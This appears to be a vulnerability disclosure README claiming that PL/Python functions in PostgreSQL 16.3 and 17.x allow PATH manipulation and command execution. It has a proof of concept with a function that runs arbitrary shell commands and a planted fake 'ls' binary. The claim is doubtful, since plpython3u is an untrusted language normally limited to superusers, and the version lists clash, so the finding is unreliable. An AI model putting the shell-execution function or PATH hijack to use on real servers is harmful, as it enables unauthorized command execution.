# PostgreSQL Environment Variable Manipulation Vulnerability

## Description
This repository documents a vulnerability identified in PostgreSQL versions 16.3, 17.1 and 17.2 that allows for unauthorized manipulation of environment variables using `PL/Python` functions. 
This issue can lead to unauthorized command execution, privilege escalation, and other potential security impacts.

## Affected Products/Versions
- **Product**: PostgreSQL
- **Versions Affected**: 16.3, 17.1

## Proof-of-Concept (PoC)
### Steps to Reproduce
1. Connect to the PostgreSQL database as a user with permissions to create functions.
   ```bash
   psql -U [username] -d [database_name]
2. Create a PL/Python function to modify the PATH environment variable:
   ```bash
   CREATE FUNCTION test_env_python() RETURNS void AS $$
   import os
   os.environ['PATH'] = '/tmp/test_bin:' + os.environ['PATH']
   $$ LANGUAGE plpython3u;
3. Verify the change by creating a custom script in /tmp/test_bin and executing it through PostgreSQL.
   Create the script:
   ```bash
   mkdir /tmp/test_bin
   echo -e '#!/bin/bash\n echo "Custom script executed!"' > /tmp/test_bin/ls
   chmod +x /tmp/test_bin/ls
4. Execute the script through a PostgreSQL function:
   ```bash
   CREATE FUNCTION run_shell_command(cmd TEXT) RETURNS void AS $$
   import subprocess
   subprocess.run(cmd, shell=True)
   $$ LANGUAGE plpython3u;

   SELECT run_shell_command('ls');

## Expected Outcome
The custom ls script in /tmp/test_bin is executed, demonstrating that environment variable manipulation allows for custom command execution.

### Impact

### This vulnerability enables:

Unauthorized Code Execution: An attacker with permissions to create functions may modify the environment and execute arbitrary commands.
Privilege Escalation: Depending on the privileges of the PostgreSQL user, an attacker may gain higher-level access or control over the underlying server.

## Suggested Mitigations

-Restrict Permissions: Limit the creation of PL/Python and PL/Perl functions to trusted users only.
-Environment Variable Sanitization: Ensure that environment variables are properly sanitized and modifications are restricted.
-Upgrade PostgreSQL: If a fix is released by the PostgreSQL Global Development Group, update to the latest version.
-Audit Database Functions: Regularly audit user-created functions to detect and prevent potential exploitation.

Discovered by Fabian Mora, November 2024.
   
